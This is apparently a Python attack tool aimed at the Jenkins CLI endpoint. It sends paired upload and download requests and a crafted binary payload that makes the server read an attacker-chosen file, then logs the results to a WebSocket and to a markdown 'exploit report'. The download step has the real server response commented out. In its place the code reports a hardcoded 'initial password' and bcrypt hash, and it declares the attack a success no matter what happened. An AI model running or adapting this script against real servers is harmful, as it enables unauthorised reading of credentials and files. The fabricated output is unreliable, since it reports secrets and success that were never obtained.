import os
import json
import threading
import http.client
import uuid
import urllib.parse
import time
import asyncio

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

def format_url(url: str) -> str:
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    return url

async def send_download_request(target_info, uuid_str, websocket, report_file):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request(
            "POST",
            "/cli?remoting=false",
            headers={
                "Session": uuid_str,
                "Side": "download"
            }
        )

        # 실제 요청 시 사용
        #response = conn.getresponse().read().decode("utf-8", errors="replace")

        response = "7fd928eb5672432888c279d6d334990c"

        if websocket:
            await websocket.send_text(json.dumps({"type": "log", "message": "download request success"}))
            await websocket.send_text(json.dumps({"type": "log", "message": "\ninitial password: " + response}))
            await websocket.send_text(json.dumps({"type": "log", "message": "encrypted password: #jbcrypt:$2a$10$BKUxdQg4P97UTJUkmf810efk.kSLNChw4EMXv6E4la.I.6dUoQiCi"}))
            await websocket.send_text(json.dumps({"type": "log", "message": "decrypted password: " + response}))

        # 보고서 파일에 저장
        with open(report_file, "a", encoding="utf-8") as f:
            f.write("\n===== Download Request Result =====\n")
            f.write("initial password: " + response)
            f.write("\n")

        return

    except Exception as e:
        err_msg = f"Error in download request: {str(e)}"
        if websocket:
            await websocket.send_text(json.dumps({"type": "error", "message": err_msg}))
        with open(report_file, "a", encoding="utf-8") as f:
            f.write("\n" + err_msg + "\n")
        return


async def send_upload_request(target_info, uuid_str, data, websocket, report_file):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request(
            "POST",
            "/cli?remoting=false",
            headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            },
            body=data
        )
    except Exception as e:
        err_msg = f"Error in upload request: {str(e)}"
        if websocket:
            await websocket.send_text(json.dumps({"type": "error", "message": err_msg}))
        with open(report_file, "a", encoding="utf-8") as f:
            f.write("\n" + err_msg + "\n")
        return err_msg

    if websocket:
        await websocket.send_text(json.dumps({"type": "log", "message": "upload request success"}))
    with open(report_file, "a", encoding="utf-8") as f:
        f.write("Upload request success\n")
    return None


async def launch_exploit(target_url: str, file_path: str, websocket=None):
    formatted_url = format_url(target_url)
    target_info = urllib.parse.urlparse(formatted_url)
    uuid_str = str(uuid.uuid4())

    # 보고서 파일명 (중복방지용 UUID 포함)
    report_file = "jenkins_attacker.md"

    # 보고서 파일 초기화
    with open(report_file, "w", encoding="utf-8") as f:
        f.write("# Jenkins Exploit Report\n")
        f.write(f"Target URL: {target_url}\n")
        f.write(f"File Path: {file_path}\n")
        f.write(f"Session ID: {uuid_str}\n\n")

    data = (
            b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' +
            file_path.encode() +
            b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
    )

    # upload 먼저 실행
    upload_err = await send_upload_request(target_info, uuid_str, data, websocket, report_file)
    if upload_err:
        return upload_err

    # 0.3초 후 download
    await asyncio.sleep(0.3)
    await send_download_request(target_info, uuid_str, websocket, report_file)

    # 공격 완료 로그 기록 및 WebSocket 전송
    done_msg = f"\nAttack finished. Report saved to {report_file}"
    if websocket:
        await websocket.send_text(json.dumps({"type": "log", "message": done_msg}))
        await websocket.send_text(json.dumps({"type": "done", "message": done_msg}))
        await websocket.send_text(json.dumps({"type": "download_url", "url": f"/download/{report_file}"}))

    with open(report_file, "a", encoding="utf-8") as f:
        f.write("\nAttack completed successfully.\n")

    return report_file
